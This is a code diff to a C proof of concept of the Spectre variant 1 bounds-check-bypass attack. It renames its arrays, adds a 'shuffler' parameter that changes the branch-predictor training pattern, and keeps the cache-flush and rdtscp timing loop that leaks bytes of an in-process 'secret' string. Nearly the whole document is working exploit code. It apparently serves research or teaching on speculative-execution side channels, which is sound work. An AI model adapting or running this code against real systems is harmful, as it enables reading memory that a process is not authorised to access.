@@ -11,25 +11,25 @@
 //CACHE_HIT_THRESHOLD: default is 80, assume cache hit if time <= threshold
 int CACHE_HIT_THRESHOLD;
 // An array whose memory locations are available to read, write and modify for an attacker
-uint8_t availableMemoryArray[160] = {};
+uint8_t array[160] = {};
 // The size of the array
-unsigned int arrayAvailableSize = 160;
-// An array used to point on memory locations that the user is not authorized to access.
-uint8_t unavailableMemoryArray[256 * 512];
-// for test whether the code is working, pointer on "secret" (unauthorized for us) location
+unsigned int arraySize = 160;
+// An array used to point on memory locations that the user is not authorized to access (by offset).
+uint8_t offsetArray[256 * 512];
+// pointer on "secret" (unauthorized for us) location
 char* secret = "Secret message hidden in memory";
 
 // Prevents the compiler from optimization of the victim_function
 uint8_t temp = 0;
 
 void victim_function(size_t x) {
-    if (x < arrayAvailableSize) {
-        temp &= unavailableMemoryArray[availableMemoryArray[x] * 512];
+    if (x < arraySize) {
+        temp &= offsetArray[array[x] * 512];
     }
 }
 
 
-void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
+void readMemoryByte(size_t malicious_x, int shuffler, uint8_t value[2], int score[2]) {
     static int results[256];
     int tries, i, j, indexHighest, indexSecondHighest, mix_i;
     unsigned int junk = 0;
@@ -40,39 +40,36 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     for (i = 0; i < 256; i++)
         results[i] = 0;
     for (tries = 999; tries > 0; tries--) {
-        // flushing every variable unavailableMemoryArray memory location from cache
+        // flushing every variable offsetArray memory location from cache
         for (i = 0; i < 256; i++)
-            _mm_clflush(&unavailableMemoryArray[i * 512]);
+            _mm_clflush(&offsetArray[i * 512]);
 
         // 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x)
         // training_x has value between 0 and 159 in our case
         for (j = 29; j >= 0; j--)
         {
             // for each iteration memory location address of array1_size is flushed from cache
-            _mm_clflush(&arrayAvailableSize);
-            // delay, to be improved
+            _mm_clflush(&arraySize);
+            // delay, to be improved (can also mfence)
             for (volatile int z = 0; z < 100; z++)
             {
-            } /* Delay (can also mfence) */
+            }
 
-            /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
+            /* Bit twiddling to set x=training_x if j% 11 + shuffler !=0 or malicious_x if j% 11 + shuffler ==0 */
             /* Avoid jumps in case those tip off the branch predictor */
-            x = ((j % 6) - 1) & malicious_x; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
+            x = ((j % (11 + shuffler)) - 1) & malicious_x;
 
             /* Call the victim! */
             victim_function(x);
         }
 
         // order is mixed up to prevent technique used by the processor's cache to predict the next memory access and prefetch the data in advance
-
-
-        /* Time reads. Order is lightly mixed up to prevent stride prediction */
         for (i = 0; i < 256; i++)
         {
             // mix technique is based on using prime numbers to get unique and hard to predict result, result is a value between 0 and 255
             mix_i = ((i * 167) + 13) & 255;
             // A variable which holds address of different cache line each iteration
-            addr = &unavailableMemoryArray[mix_i * 512];
+            addr = &offsetArray[mix_i * 512];
             // measures time needed for read of a cache memory address
             time1 = __rdtscp(&junk); /* READ TIMER */
             // junk now points on variable addr address
@@ -80,9 +77,10 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
             // cache memory address access time or main memory address access time  - cache memory address access time
             time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 
+
             /* checks whether the measured time for accessing a memory location is less than or equal to the CACHE_HIT_THRESHOLD
             and whether the accessed memory location is not the same as the one accessed in the previous loop iteration */
-            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != availableMemoryArray[tries % arrayAvailableSize])
+            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array[tries % arraySize])
                 // cache hit - add +1 to score for this value
                 results[mix_i]++;
         }
@@ -118,9 +116,10 @@ int main(int argc, const char **argv) {
     FileReader reader;
     int i, score[2], secretByteLength=32;
     uint8_t value[2];
+    int shuffler = 0;
     //  load into physical memory.
-    for (i = 0; i < sizeof(unavailableMemoryArray); i++)
-        unavailableMemoryArray[i] = 1;
+    for (i = 0; i < sizeof(offsetArray); i++)
+        offsetArray[i] = 1;
     //  Checks whether the program was executed with two command-line arguments,the first argument is file path
     //  the second argument is CACHE_HIT_THRESHOLD
     //  Reads file path and creates pointer to the memory location of data of file path provided
@@ -149,13 +148,13 @@ int main(int argc, const char **argv) {
         CACHE_HIT_THRESHOLD = 80;
     }
     //  Calculates the offset between the secret value and the beginning of the accessible memory array in bytes
-    size_t malicious_x=(secret-(char*)availableMemoryArray);
+    size_t malicious_x=(secret-(char*)array);
 
     printf("Reading %d bytes:\n", secretByteLength);
     while (--secretByteLength >= 0) {
         printf("Reading from a memory location = %p ", (void*)malicious_x);
         // ReadMemoryByte() function call to read a byte of data from the current memory location
-        readMemoryByte(malicious_x++, value, score);
+        readMemoryByte(malicious_x++, shuffler, value, score);
         // If score[0] is greater than or equal to twice the value of score[1], then "Success" is printed. Otherwise, "Unclear" is printed.
         printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
         printf("0x%02X='%c' score=%d        ", value[0], value[0], score[0]);
